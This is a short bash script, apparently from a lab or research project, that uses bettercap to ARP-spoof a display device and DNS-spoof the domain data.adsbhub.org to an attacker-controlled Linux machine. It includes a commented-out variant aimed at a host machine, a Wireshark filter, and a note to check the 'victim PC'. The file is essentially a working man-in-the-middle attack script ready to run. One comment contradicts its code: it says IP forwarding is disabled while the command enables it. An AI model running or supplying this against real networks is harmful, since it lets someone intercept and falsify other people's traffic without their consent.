# This script is used to disconnect the Raspberry Pi and the display from the network by ARP spoofing.
#!/bin/bash
# sudo apt install bettercap

. $(dirname "$0")/config.sh

DOMAIN="data.adsbhub.org"
# Disconnect ip forwarding
sudo sysctl -w net.ipv4.ip_forward=1

sudo bettercap -iface $INTERFACE -eval "set arp.spoof.targets $DISDISPLAY_ADRESS; set arp.spoof.fullduplex true; set arp.spoof.internal true; arp.spoof on; set dns.spoof.domains $DOMAIN; set dns.spoof.address $HACK_LINUX_MACHINE; dns.spoof on"
# sudo bettercap -iface $INTERFACE -eval "set arp.spoof.targets $HACK_HOST_MACHINE; set arp.spoof.fullduplex true; set arp.spoof.internal true; arp.spoof on; set dns.spoof.domains $DOMAIN; set dns.spoof.address $HACK_LINUX_MACHINE; dns.spoof on"

# NOTE:
# wireshark filter: dns.qry.name contains "data.adsbhub.org"
# 
 
# Check the vitim PC
# arp -a